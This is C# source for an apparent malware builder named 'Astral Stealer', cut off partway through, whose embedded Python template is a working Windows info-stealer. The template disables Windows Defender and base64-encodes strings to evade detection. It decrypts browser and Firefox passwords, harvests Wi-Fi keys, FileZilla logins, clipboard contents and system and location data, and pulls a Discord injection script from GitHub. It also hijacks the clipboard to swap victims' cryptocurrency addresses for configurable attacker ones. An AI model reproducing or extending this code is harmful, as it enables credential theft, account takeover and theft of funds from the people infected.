using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace Astral_Stealer
{
    public partial class Form1 : Form
    {
        private string exeFileName = "output";
        private string pythonCodeTemplate = @"import asyncio
import sys
import json
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import time
import pyperclip
import locale
import win32gui
import win32con
import win32api
import win32process
import cv2
import subprocess
import os
import shutil



from urllib.parse import urlparse
from configparser import ConfigParser



from tempfile import gettempdir, mkdtemp
from base64 import b64decode
from datetime import datetime, timedelta, timezone
from sys import argv
from ctypes import c_char_p, c_int, c_uint32, c_void_p, c_uint
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from subprocess import CREATE_NEW_CONSOLE, Popen, PIPE
from PIL import ImageGrab



subprocess.run(['powershell', 'Set-MpPreference', '-DisableRealtimeMonitoring', '$true'])


NotKSCH58 = base64.b64decode(b'QXN0cmFs').decode()
maybycool = base64.b64decode(b'VXNlciBEYXRh').decode()
ntwrk = base64.b64decode(b'TmV0d29yaw==').decode()
myname_little = NotKSCH58.lower()
justaterm = base64.b64decode(b'Q29va2llcw==').decode()
justatermlil = justaterm.lower()
coresecretname = base64.b64decode(b'ZGlzY29yZF9kZXNrdG9wX2NvcmU=').decode()

#EXTENSIONS IN BASE64 PREVENT DETECTIONS
extension_id1 = f'{base64.b64decode(""bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4="")}'.replace(""b'"", """").replace(""'"", """")
extension_id2= f'{base64.b64decode(""ZWpiYWxiYWtvcGxjaGxnaGVjZGFsbWVlZWFqbmltaG0="")}'.replace(""b'"", """").replace(""'"", """")
extension_id3 =  f'{base64.b64decode(""YWhvbHBmZGlhbGpnamZob21paGtqYm1namlkbGNkbm8="")}'.replace(""b'"", """").replace(""'"", """")
extension_id4 =  f'{base64.b64decode(""Zmhib2hpbWFlbGJvaHBqYmIxZGNuZ2NuYXBuZG9kanA="")}'.replace(""b'"", """").replace(""'"", """")
extension_id5 =  f'{base64.b64decode(""YmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGE="")}'.replace(""b'"", """").replace(""'"", """")
extension_id6 =  f'{base64.b64decode(""aG5mYW5rbm9jZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ="")}'.replace(""b'"", """").replace(""'"", """")
extension_id7 =  f'{base64.b64decode(""Zm5qaG1raGhta2Jqa2thYm5kY25ub2dhZ29nYm5lZWM="")}'.replace(""b'"", """").replace(""'"", """")
extension_id8 =  f'{base64.b64decode(""YWVhY2hrbm1lZnBoZXBjY2lvbmJvb2hja29ub2VlbWc="")}'.replace(""b'"", """").replace(""'"", """")
extension_id9 =  f'{base64.b64decode(""cGRhZGprZmtnY2FmZ2JjZWltY3Bia2FsbmZuZXBibms="")}'.replace(""b'"", """").replace(""'"", """")
extension_id10 =  f'{base64.b64decode(""YWlpZmJuYmZvYnBtZWVraXBoZWVpamltZHBuSXBncHA="")}'.replace(""b'"", """").replace(""'"", """")
extension_id11=  f'{base64.b64decode(""amttbWpqbW1mbGRkb2dtaHBqbG9pbWlwYm9mbmZqaWg="")}'.replace(""b'"", """").replace(""'"", """")
extension_id12=  f'{base64.b64decode(""Zm5uZWdwG2hvYmphamRwa2hlY2Fwa2lqamRrZ2NqaGtpYg=="")}'.replace(""b'"", """").replace(""'"", """")
extension_id13 =  f'{base64.b64decode(""SXBmY2Jqa25pamVlaWxsaWZua2lrZ25jaWtnbmNpa2dmaGRv"")}'.replace(""b'"", """").replace(""'"", """")
extension_id14 =  f'{base64.b64decode(""ZWZiZ0lnb2ZvaXBwYmdiY2plcG5oaWJsYWlic25jaGVpZ2hqYWpi"")}'.replace(""b'"", """").replace(""'"", """")
extension_id15 =  f'{base64.b64decode(""am5sZ2FtZWNicG1iYWpqZmhtbW1saGVqa2VtZWpkbWE="")}'.replace(""b'"", """").replace(""'"", """")
extension_id16 =  f'{base64.b64decode(""aG1lb2JuZm5mZmNtZGtka21sYjFnYWdtZnBmYm9pZWFm"")}'.replace(""b'"", """").replace(""'"", """")
extension_id17 =  f'{base64.b64decode(""ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoaGphamJ="")}'.replace(""b'"", """").replace(""'"", """")
extension_id18 =  f'{base64.b64decode(""bnBoaUltcGdvYWtoaGpjaGtrbGhtaWdnYWtpam5raGZuZA=="")}'.replace(""b'"", """").replace(""'"", """")
extension_id19 =  f'{base64.b64decode(""YmhnAGhvbWFwY2RwYm9ocGhpZ29vb2FkZGRpcmtwb2tuYmFp"")}'.replace(""b'"", """").replace(""'"", """")
extension_id20 =  f'{base64.b64decode(""aWJuZWpkZmptbWtwY25JcGViazFtbmtvZWlwaG9mZWM="")}'.replace(""b'"", """").replace(""'"", """")
extension_id21 = f'{base64.b64decode(""Zmhib2hpbWFlbGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA="")}'.replace(""b'"", """").replace(""'"", """")

#STRINGIFY EXTENSIONS DECODED
inp1  = str(extension_id1)
inp2  = str(extension_id2)
inp3  = str(extension_id3)
inp4  = str(extension_id4)
inp5  = str(extension_id5)
inp6  = str(extension_id6)
inp7 = str(extension_id7)
inp8 = str(extension_id8)
inp9 = str(extension_id9)
inp10 = str(extension_id10)
inp11 = str(extension_id11)
inp12 = str(extension_id12)
inp13 = str(extension_id13)
inp14 = str(extension_id14)
inp15 = str(extension_id15)
inp16 = str(extension_id16)
inp17 = str(extension_id17)
inp18 = str(extension_id18)
inp19 = str(extension_id19)
inp20 = str(extension_id20)
inp21 = str(extension_id21)


#PARSE IN JSON TO IDENTIFY EXTENSION NAME
local_identifier = {
    inp1: ""Metamask"",
    inp2: ""Metamask2"",
    inp3: ""Exodus"",
    inp4: ""Binance"",
    inp5: ""Phantom"",
    inp6: ""Coinbase"",
    inp7: ""Ronin"",
    inp8: ""Coin98"",
    inp9: ""Kardiachain"",
    inp10: ""Terrastation"",
    inp11: ""Wombat"",
    inp12: ""Harmony"",
    inp13: ""Nami"",
    inp14: ""MartianAptos"",
    inp15: ""Braavos"",
    inp16: ""XDEFI"",
    inp17: ""Voroi"",
    inp18: ""TON"",
    inp19: ""Authenticator"",
    inp20: ""Tron"",
    inp21: ""Binance""
}


regx_net = r""[\w-]{24}\."" + base64.b64decode(b'W1x3LV17Nn1cLltcdy1dezI1LDExMH0=').decode()
imthebestdev = os.getlogin()
spoted_victim = os.getenv(""COMPUTERNAME"")
space_stored = str(psutil.disk_usage(""/"")[0] / 1024 ** 3).split(""."")[0]
fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(""."")[0]
shell32 = ctypes.windll.shell32
local = os.getenv(""LOCALAPPDATA"")
roaming = os.getenv(""APPDATA"")
temp = os.getenv(""TEMP"")
Notpasswrd = []

json_confg = {
    ""created_by"": ""%PC_CREATOR%"",
    ""apilink"": ""%API_LINK%"",
    ""hooking_hawk"": ""%B64_WBH_STR%"",
    ""browsers_found"": ""%_GetBrowsers_Options%"",
    ""found_av"": ""%AntiVirus_Options%"",
    ""files_mc"": ""%_Games_Options%"",
    ""sys_found"": ""%Sys_Options%"",
    ""roblox_found"": ""%Roblox_Options%"",
    ""screen_found"": ""%Screen_Options%"",
    ""ping_config"": ""%Ping_Options%"",
    ""clipboard_found"": ""%ClipBoard_Options%"",
    ""w1f1_found"": ""%Wifi_Options%"",
    ""hide_config"": ""%Hide_Options%"",
    ""pingtype_config"": ""%PingType_Options%"",
    ""killdiscord_config"": '%KillDiscord_Options%',
    ""fake_error_config"": ""%_error_thiefcat%"",
    ""startup_config"": ""%Startup_Options%"",
    ""little_voice"": ""%_LilVoice_Options%"",
    ""chromenject_config"": ""%InjectBrowsers_Options%"",
    ""url_hawkinject"": ""https://raw.githubusercontent.com/freeman649/assets-thief/main/discord-inject.js"",
    ""telegram_found"": ""%Telegram_Options%"",
    ""filezilla_found"": ""%Telegram_Options%"",
    ""SAEZRTYRES1"": '%Debugger_Options%',
    ""AEAZAKG55"": ""%Disable_Defender_Options%"",
    ""AEZRETRYY5"": ""%InjectDiscord_Options%"",
    ""AEZAZRETG55"": ""%ADA_address_Options%"",
    ""MPALFLLLL"": ""%CryptoReplacer_Options%"",
    ""A8666ACLLLL"": ""%BTC_address_Options%"",
    ""AEZ56TRYY5"": ""%DASH_address_Options%"",
    ""LOA444KVDSO"": ""%_ETH_address_Options%"",
    ""MPALAGZBLL"": ""%_XCHAIN_address_Options%"",
    ""MPLAO55599BL"": ""%PACHAIN_address_Options%"",
    ""LOGZKNNNN"": ""%CCHAIN_address_Options%"",
    ""AKEOZDSON9N"": ""%MONERO_address_Options%"",
    ""bindoption"": ""%Bind_Options%"",
    ""launcher_found"": ""%_Found_Launcher%"",
    ""crypto_found"": ""%Crypto_Options%"",
}




url = f""https://raw.githubusercontent.com/meccksch/cerf/main/assets/nope.json""
response = requests.get(url)

try:
    if response.status_code == 200:
        arrayprgg = response.json()
except:
    arrayprgg = {
""blacklistedprog"": [
        ""None"",
        ]
    }

class Functions(object):
    @staticmethod
    def decode_filezilla_xml(file_path):
        if not os.path.exists(file_path):
            return None
        
        with open(file_path, ""r"", encoding=""utf-8"") as file:
            xml_content = file.read()
        
        credentials = []
        server_regex = r""<Server>(.*?)</Server>""
        host_regex = r""<Host>(.*?)</Host>""
        port_regex = r""<Port>(.*?)</Port>""
        protocol_regex = r""<Protocol>(.*?)</Protocol>""
        user_regex = r""<User>(.*?)</User>""
        pass_regex = r""<Pass encoding=\""(.*?)\"">(.*?)</Pass>""
        
        server_matches = re.findall(server_regex, xml_content, re.DOTALL)
        
        for server_match in server_matches:
            host_match = re.search(host_regex, server_match)
            port_match = re.search(port_regex, server_match)
            protocol_match = re.search(protocol_regex, server_match)
            user_match = re.search(user_regex, server_match)
            pass_match = re.search(pass_regex, server_match)
            
            if host_match and port_match and protocol_match and user_match and pass_match:
                host = host_match.group(1)
                port = port_match.group(1)
                protocol = protocol_match.group(1)
                user = user_match.group(1)
                pass_value = base64.b64decode(pass_match.group(2)).decode(""utf-8"")
                
                credentials.append({
                    ""Host"": host,
                    ""Port"": port,
                    ""Protocol"": protocol,
                    ""User"": user,
                    ""Pass"": pass_value,
                })
        
        return credentials
    @staticmethod
    def NotKSCH58findClipboard():
        return subprocess.run(""powershell Get-Clipboard"", shell=True, capture_output=True).stdout.decode(errors='backslashreplace').strip()
    
    @staticmethod
    def NotKSCH58findDevices():
        try:
            command = 'powershell -Command ""Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match \'^USB\' }""'
            process = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=0x08000000)
            if process.returncode == 0:
                return process.stdout
            else:
                pass
            return None
        except:
            pass


    @staticmethod
    def NotKSCH58findwifi():
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[(line.find(':') + 1):].strip()
                profiles.append(name)

        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile ""{profile}"" key=clear', shell=True,capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def time_convertion(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def mykey_gtm(path: str or os.PathLike) -> str or None:
        try:
            with open(path, ""r"", encoding=""utf-8"") as f:
                local_state = json.load(f)
            encrypted_key = local_state.get(
                ""os_crypt"", {}).get(""encrypted_key"")
            if not encrypted_key:
                return None
            encrypted_key = b64decode(encrypted_key)[5:]
            return Functions.decrypt_windows(encrypted_key)
        except (FileNotFoundError, json.JSONDecodeError, ValueError):
            return None

    @staticmethod
    def files_creating(_dir: str or os.PathLike = gettempdir()):
        f1lenom = """".join( random.SystemRandom().choice(""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"") for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, f1lenom)
        open(path, ""x"")
        return path

    @staticmethod
    def header_making(token: str = None):
        headers = {
            ""Content-Type"": ""application/json"",
        }
        if token:
            headers.update({""Authorization"": token})
        return headers

    @staticmethod
    def decrypt_windows(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def info_sys() -> list:
        flag = 0x08000000
        sh1 = ""wmic csproduct get uuid""
        sh2 = ""powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault""
        sh3 = ""powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName""
        try:
            window_wid = (
                subprocess.check_output(sh1, creationflags=flag)
                .decode()
                .split(""\n"")[1]
                .strip()
            )
        except Exception:
            window_wid = ""N/A""
        try:
            windowfoundkey = (
                subprocess.check_output(sh2, creationflags=flag).decode().rstrip())
        except Exception:
            windowfoundkey = ""N/A""
        try:
            wind_never = (
                subprocess.check_output(sh3, creationflags=flag).decode().rstrip())
        except Exception:
            wind_never = ""N/A""
        return [window_wid, wind_never, windowfoundkey]

    @staticmethod
    def value_decrypt(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt ""{str(buff)}"" | key: ""{str(master_key)}""'

    @staticmethod
    def find_in_config(e: str):
        value = json_confg.get(e)
        if value is not None:
            return value
        else: 
            value = set(e)
            if value is not None:
                return value
                
    @staticmethod
    def info_netword() -> list:
        ip, city, country, region, org, loc, googlemap = (
            ""None"",
            ""None"",
            ""None"",
            ""None"",
            ""None"",
            ""None"",
            ""None"",
        )
        try:
            req = httpx.get(""https://ipinfo.io/json"")
            if req.status_code == 200:
                data = req.json()
                ip = data.get(""ip"")
                city = data.get(""city"")
                country = data.get(""country"")
                region = data.get(""region"")
                org = data.get(""org"")
                loc = data.get(""loc"")
                googlemap = ""https://www.google.com/maps/search/google+map++"" + loc
        except:
            pass
        return [ip, city, country, region, org, loc, googlemap]


class Replacer_Loop(Functions):
    def __init__(self):
        self.btc_finder = self.find_in_config(""MPALFLLLL"")
        self.addresses = {
            ""btc"": self.find_in_config(""A8666ACLLLL""),
            ""eth"": self.find_in_config(""LOA444KVDSO""),
            ""xchain"": self.find_in_config(""MPALAGZBLL""),
            ""pchain"": self.find_in_config(""MPLAO55599BL""),
            ""cchain"": self.find_in_config(""LOGZKNNNN""),
            ""monero"": self.find_in_config(""AKEOZDSON9N""),
            ""ada"": self.find_in_config(""AEZAZRETG55""),
            ""dash"": self.find_in_config(""AEZ56TRYY5""),
        }

    def copy_address(self, regex, address_key):
        clipboard_data = pyperclip.paste()
        if re.search(regex, clipboard_data):
            if address_key in self.addresses and clipboard_data not in self.addresses.values():
                address = self.addresses[address_key]
                if address != ""none"":
                    pyperclip.copy(address)

    def address_swap(self):
        self.copy_address(""^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"", ""btc"")
        self.copy_address(""^0x[a-fA-F0-9]{40}$"", ""eth"")
        self.copy_address(""^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$"", ""xchain"")
        self.copy_address(""^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$"", ""pchain"")
        self.copy_address(""^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$"", ""cchain"")
        self.copy_address(""addr1[a-z0-9]+"", ""ada"")
        self.copy_address(""/X[1-9A-HJ-NP-Za-km-z]{33}$/g"", ""dash"")
        self.copy_address(""/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g"", ""monero"")

    def loop_through(self):
        while True:
            self.address_swap()

    def run(self):
        if self.btc_finder == ""yes"":
            self.loop_through()

class NotFoundError(Exception):
    pass


class Credentials(object):
    def __init__(self, db):
        self.db = db
        if not os.path.isfile(db):
            raise NotFoundError(""ERROR - {0} database not found\n"".format(db))
    def __iter__(self):
        pass
    def done(self):
        pass


class SqliteCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, ""signons.sqlite"")
        super(SqliteCredentials, self).__init__(db)
        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self):
        self.c.execute(""SELECT hostname, encryptedUsername, encryptedPassword, encType ""
                       ""FROM moz_logins"")
        for i in self.c:
            yield i

    def done(self):
        super(SqliteCredentials, self).done()
        self.c.close()
        self.conn.close()


class JsonCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, ""logins.json"")
        super(JsonCredentials, self).__init__(db)

    def __iter__(self):
        with open(self.db) as fh:
            data = json.load(fh)
            try:
                logins = data[""logins""]
            except:
                raise Exception(""Unrecognized format in {0}"".format(self.db))
            for i in logins:
                yield (i[""hostname""], i[""encryptedUsername""],
                       i[""encryptedPassword""], i[""encType""])


class NSSDecoder(object):
    class SECItem(ctypes.Structure):
        _fields_ = [
            ('type', c_uint),
            ('data', c_char_p),
            ('len', c_uint),
        ]

    class PK11SlotInfo(ctypes.Structure):
        ...

    def __init__(self):
        try:
            self.NSS = None
            self.load_libnss()
            SlotInfoPtr = ctypes.POINTER(self.PK11SlotInfo)
            SECItemPtr = ctypes.POINTER(self.SECItem)
            self._set_ctypes(c_int, ""NSS_Init"", c_char_p)
            self._set_ctypes(c_int, ""NSS_Shutdown"")
            self._set_ctypes(SlotInfoPtr, ""PK11_GetInternalKeySlot"")
            self._set_ctypes(None, ""PK11_FreeSlot"", SlotInfoPtr)
            self._set_ctypes(c_int, ""PK11_CheckUserPassword"", SlotInfoPtr, c_char_p)
            self._set_ctypes(c_int, ""PK11SDR_Decrypt"", SECItemPtr, SECItemPtr, c_void_p)
            self._set_ctypes(None, ""SECITEM_ZfreeItem"", SECItemPtr, c_int)
            self._set_ctypes(c_int, ""PORT_GetError"")
            self._set_ctypes(c_char_p, ""PR_ErrorToName"", c_int)
            self._set_ctypes(c_char_p, ""PR_ErrorToString"", c_int, c_uint32)
        except:
            pass

    def _set_ctypes(self, restype, name, *argtypes):
        try:
            res = getattr(self.NSS, name)
            res.restype = restype
            res.argtypes = argtypes
            setattr(self, ""_"" + name, res)
        except:
            pass


    @staticmethod
    def find_nss(locations, nssname):
        try:
            for loc in locations:
                if os.path.exists(os.path.join(loc, nssname)):
                    return loc
            return """"
        except:
            pass


    def load_libnss(self):
        try:
            if os.name == ""nt"":
                nssname = ""nss3.dll""
                locations = (
                    """", 
                    r""C:\Program Files (x86)\Mozilla Firefox"",
                    r""C:\Program Files\Mozilla Firefox""
                )
                firefox = self.find_nss(locations, nssname)
                if firefox:
                    os.environ[""PATH""] = ';'.join([os.environ[""PATH""], firefox])
            elif os.uname()[0] == ""Darwin"":
                nssname = ""libnss3.dylib""
                locations = (
                    """",  
                    ""/usr/local/lib/nss"",
                    ""/usr/local/lib"",
                    ""/opt/local/lib/nss"",
                    ""/sw/lib/firefox"",
                    ""/sw/lib/mozilla"",
                    ""/usr/local/opt/nss/lib"", 
                    ""/opt/pkg/lib/nss"",
                )
                firefox = self.find_nss(locations, nssname)
            else:
                nssname = ""libnss3.so""
                firefox = """"
            try:
                if firefox:
                    nsslib = os.path.join(firefox, nssname)
                    self.NSS = ctypes.CDLL(nsslib)
            except Exception as e:
                pass
        except:
            pass



    def handle_error(self):
        try:
            code = self._PORT_GetError()
            name = self._PR_ErrorToName(code)
            name = ""NULL"" if name is None else name.decode(""ascii"")
            text = self._PR_ErrorToString(code, 0)
            text = text.decode(""utf8"")
        except:
            pass


    def decode(self, data64):
        try:
            data = b64decode(data64)
            inp = self.SECItem(0, data, len(data))
            out = self.SECItem(0, None, 0)
            e = self._PK11SDR_Decrypt(inp, out, None)
            try:
                if e == -1:
                    pass
                res = ctypes.string_at(out.data, out.len).decode(""utf8"")
            finally:
                self._SECITEM_ZfreeItem(out, 0)
            return res
        except:
            pass


class NotKSCH58_first_funct(Functions):
    def __init__(self):
        
        self.profile = None
        self.NSS = NSSDecoder()

        self.firefox_installed = False

        self.eco_baby = f'{base64.b64decode(self.find_in_config(""hooking_hawk""))}'.replace(""b'"", """").replace(""'"", """")
        self.ecobybro = str(self.eco_baby)

        self.thingstocount = {
            f'{justatermlil}': 0,
            'passwrd': 0,
            'screenshotbro': 0,
            'creditcard': 0,
            'historybaby': 0,
            'bookmarksbaby':0,
            'info_discord': 0,
            'roblox_friendly': 0,
            'friendlybabymc': 0,
            'wifinet': 0
        }
        self.ccounter ={
    ""mail"": 0,
    ""[gmail](https://gmail.com)"": 0,
    ""[sellix](https://sellix.io)"": 0,
    ""[steam](https://steam.com)"": 0,
    ""[discord](https://discord.com)"": 0,
    ""[riotgames](https://riotgames.com)"": 0,
    ""[youtube](https://youtube.com)"": 0,
    ""[instagram](https://instagram.com)"": 0,
    ""[tiktok](https://tiktok.com)"": 0,
    ""[twitter](https://twitter.com)"": 0,
    ""[facebook](https://facebook.com)"": 0,
    ""card"": 0,
    ""[epicgames](https://epicgames.com)"": 0,
    ""[spotify](https://spotify.com)"": 0,
    ""[yahoo](https://yahoo.com)"": 0,
    ""[roblox](https://roblox.com)"": 0,
    ""[twitch](https://twitch.com)"": 0,
    ""[minecraft](https://minecraft.net)"": 0,
    ""bank"": 0,
    ""[paypal](https://paypal.com)"": 0,
    ""[origin](https://origin.com)"": 0,
    ""[amazon](https://amazon.com)"": 0,
    ""[ebay](https://ebay.com)"": 0,
    ""[aliexpress](https://aliexpress.com)"": 0,
    ""[playstation](https://playstation.com)"": 0,
    ""[hbo](https://hbo.com)"": 0,
    ""[xbox](https://xbox.com)"": 0,
    ""buy"": 0,
    ""sell"": 0,
    ""[binance](https://binance.com)"": 0,
    ""[hotmail](https://hotmail.com)"": 0,
    ""[outlook](https://outlook.com)"": 0,
    ""[crunchyroll](https://crunchyroll.com)"": 0,
    ""[telegram](https://telegram.com)"": 0,
    ""[pornhub](https://pornhub.com)"": 0,
    ""[disney](https://disney.com)"": 0,
    ""[expressvpn](https://expressvpn.com)"": 0,
    ""crypto"": 0,
    ""[uber](https://uber.com)"": 0,
    ""[netflix](https://netflix.com)"": 0,
        }

        self.thishawk_webh = self.ecobybro

        self.apilink = self.find_in_config(""apilink"")
        
        self.soundedornot = self.find_in_config(""little_voice"")
        
        self.created_by = self.find_in_config(""created_by"")

        self.gangman = str(self.created_by)

        self.str_creator_ = self.gangman

        self.hide = self.find_in_config(""hide_config"")

        self.Found_Crypto = self.find_in_config(""crypto_found"")

        self.launcher = self.find_in_config(""launcher_found"")

        self.bindoption = self.find_in_config(""bindoption"")

        self.disablemydefender = self.find_in_config(""AEAZAKG55"")

        self.pingtype = self.find_in_config(""pingtype_config"")

        self.pingonrun = self.find_in_config(""ping_config"")

        self.disc_url_api = ""https://discord.com/api/v9/users/@me""

        self.startupexe = self.find_in_config(""startup_config"")

        self.fake_error = self.find_in_config(""fake_error_config"")

        self.Found_Browsers = self.find_in_config(""browsers_found"")

        self.Found_AV = self.find_in_config(""found_av"")

        self.Found_Game = self.find_in_config(""files_mc"")

        self.Found_Sys = self.find_in_config(""sys_found"")

        self.Found_Roblox = self.find_in_config(""roblox_found"")

        self.Found_Screen = self.find_in_config(""screen_found"")

        self.Found_Clipboard = self.find_in_config(""clipboard_found"")

        self.Found_Telegram = self.find_in_config(""telegram_found"")

        self.Found_FileZilla = self.find_in_config(""filezille_found"")

        self.Found_Wifi = self.find_in_config(""w1f1_found"")

        self.appdata = local

        self.roaming = roaming

        self._1 = ""Google""

        self.chrome_user_path = os.path.join(self.appdata, self._1, ""Chrome"", maybycool)

        self.dir, self.temp = mkdtemp(), gettempdir()

        inf, net = self.info_sys(), self.info_netword()

        self.total, self.used, self.free = shutil.disk_usage(""/"")

        self.pc_codewinl = locale.getdefaultlocale()[0]
        self.fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(""."")[0]

        self.total_gb = self.total / (2**30)
        self.used_gb = self.used / (2**30)
        self.free_gb = self.free / (2**30)

        self.used_percent = self.used / self.total * 100

        self.progress_bar_length = 20
        self.num_filled_blocks = int(
            self.used_percent / 100 * self.progress_bar_length)
        self.progress_bar = ""["" + "" "" * self.num_filled_blocks + ""."" * \
            (self.progress_bar_length - self.num_filled_blocks) + ""]""

        self.window_wid, self.never_wind, self.windowfoundkey = (
            inf[0],
            inf[1],
            inf[2],
        )

        (
            self.ip,
            self.city,
            self.country,
            self.region,
            self.org,
            self.loc,
            self.googlemap,
        ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])

        self.localstartup = os.path.join(self.roaming, ""Microsoft"", ""Windows"", ""Start Menu"", ""Programs"", ""Startup"")

        self.webapi_find = ""api/webhooks""

        self.rgx_chrome = re.compile(r""(^profile\s\d*)|default|(guest profile$)"", re.IGNORECASE | re.MULTILINE)

        self.disc_url_api = ""https://discord.com/api/v9/users/@me""

        self.regex = regx_net

        self.rgx_thiefcat = r""dQw4w9WgXcQ:[^\""]*""

        self.hawked = []

        self.NotKSCH58id = []

        self.sep = os.sep

        self.rblxcckcs = []

        self.thezip_url = """"

        self.chrome_key = self.mykey_gtm(
            os.path.join(self.chrome_user_path, ""Local State""))

        os.makedirs(self.dir, exist_ok=True)    

        #EXTENSIONS INJECTOR
        self.programdata = os.environ['ProgramData']

        self.operagx = False
        self.opera = False
        self.brave = False
        self.chrome = False
        self.vivaldi = False
        self.edge = False
        self.yandex = False
        self.iron = False
        self.kiwi = False
        self.torch = False
        self.slimjet = False
        self.dragon = False
        self.operaneon = False

        self.browser_processes = {
                'chrome': 'chrome.exe',
                'opera': 'opera.exe',
                'opera_gx': 'opera_gx.exe',
                'brave': 'brave.exe',
                'vivaldi': 'vivaldi.exe',
                'edge': 'msedge.exe',
                'yandex': 'browser.exe',
                'iron': 'iron.exe',
                'kiwi': 'kiwi.exe',
                'torch' : 'torch.exe',
                'slimjet': 'slimjet.exe',
                'dragon': 'dragon.exe',
                'opera_neon': 'opera_neon.exe'
            }

        self.path_shortcutnav_roaming = {
            ""Google Chrome"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk"",
            ""Opera"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk"",
            ""Opera GX"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk"",
            ""Brave"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk"",
            ""Vivaldi"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk"",
            ""Microsoft Edge"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk"",
            ""Yandex Browser"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk"",
            ""SRWare Iron"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk"",
            ""Kiwi Browser"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk"",
            ""Torch Browser"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk"",
            ""Slimjet"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk"",
            ""Comodo Dragon"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk"",
            ""Opera Neon"": f""{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk""
        }
        self.path_shortcutnav_programdata = {
            ""Google Chrome"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk"",
            ""Opera"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk"",
            ""Opera GX"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk"",
            ""Brave"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk"",
            ""Vivaldi"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk"",
            ""Microsoft Edge"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk"",
            ""Yandex Browser"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk"",
            ""SRWare Iron"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk"",
            ""Kiwi Browser"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk"",
            ""Torch Browser"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk"",
            ""Slimjet"": f""{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk"",
